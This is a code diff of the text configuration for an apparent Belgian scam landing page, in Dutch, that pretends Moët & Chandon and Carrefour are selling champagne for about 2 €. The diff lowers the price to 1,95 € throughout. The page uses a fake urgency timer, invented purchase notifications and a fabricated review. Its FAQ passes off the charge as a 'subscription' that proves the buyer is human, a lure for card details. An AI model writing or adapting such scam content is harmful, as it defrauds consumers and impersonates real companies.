@@ -1,6 +1,6 @@
 const orderHref = window.__order_href;
 const orderOriginParam = window.__origin_param;
-const siteKey = "moet-be";
+const siteKey = "moet-be-2";
 
 (function (exp) {
   const countryCode = "be";
@@ -21,20 +21,20 @@ const siteKey = "moet-be";
     newPrice: "",
     selectText: "",
     timer: "De tijd is beperkt, haast u om uw bestelling te plaatsen!",
-    text: "Om zijn 280ste verjaardag te vieren, heeft het toonaangevende champagnemerk <b>Moёt&Chandon</b> samen met de <b>Belgische</b> supermarktketen <b>Carrefour</b> een verkoop gelanceerd van 1.000 flessen Brut Impérial champagne voor slechts <b>2€</b>.",
+    text: "Om zijn 280ste verjaardag te vieren, heeft het toonaangevende champagnemerk <b>Moёt&Chandon</b> samen met de <b>Belgische</b> supermarktketen <b>Carrefour</b> een verkoop gelanceerd van 1.000 flessen Brut Impérial champagne voor slechts <b>1,95 €</b>.",
   };
 
   const notifications = [
     {
       user: "Bea V***",
       location: "Brussel, België",
-      action: "Heeft net Moet&Chandon Brut Imperial gekocht voor 2,00 €!",
+      action: "Heeft net Moet&Chandon Brut Imperial gekocht voor 1,95 €!",
       timeago: "15 seconden geleden",
     },
     {
       user: "Tessa B***",
       location: "Antwerpen, België",
-      action: "Heeft net Moet&Chandon Brut Imperial gekocht voor 2,00 €!",
+      action: "Heeft net Moet&Chandon Brut Imperial gekocht voor 1,95 €!",
       timeago: "25 seconden geleden",
     },
   ];
@@ -76,7 +76,7 @@ const siteKey = "moet-be";
       time: "7 dagen geleden",
       header: "Wow, ik ben absoluut onder de indruk van dit product!",
       product: "26468784",
-      review: "Ongelooflijk. Een dure en kwalitatief hoogwaardige fles voor slechts 2,00 €. Bedankt!",
+      review: "Ongelooflijk. Een dure en kwalitatief hoogwaardige fles voor slechts 1,95 €. Bedankt!",
     },
   ];
 
@@ -181,8 +181,8 @@ const siteKey = "moet-be";
       answer: "U moet eerst uw afleveradres en contactgegevens invoeren, daarna zal ons systeem u verder leiden. U moet dan bewijzen dat u geen robot bent, omdat de prijs alleen wordt aangeboden aan echte mensen.",
     },
     {
-      question: "Waarom moet ik 2,00 € voor de prijs betalen?",
-      answer: "2,00 € is geen prijs - het is een abonnement dat bewijst dat u een echt persoon bent. Alle betalingen worden na goedkeuring terugbetaald.",
+      question: "Waarom moet ik 1,95 € voor de prijs betalen?",
+      answer: "1,95 € is geen prijs - het is een abonnement dat bewijst dat u een echt persoon bent. Alle betalingen worden na goedkeuring terugbetaald.",
     },
     {
       question: "Ik kan mijn creditcard niet gebruiken, de transactie is mislukt?",
@@ -240,11 +240,11 @@ const siteKey = "moet-be";
     main: {
       title: "Overzicht van de bestelling",
       oldPrice: "",
-      newPrice: "2,00 €",
+      newPrice: "1,95 €",
       size: "Grootte",
       subTotal: {
         title: "Bestelwaarde",
-        amount: "2,00 €",
+        amount: "1,95 €",
       },
       delivery: {
         title: "Levering",
@@ -252,7 +252,7 @@ const siteKey = "moet-be";
       },
       total: {
         title: "Totaal",
-        amount: "2,00 €",
+        amount: "1,95 €",
       },
       checkoutButton: "Betaal uw bestelling",
     },
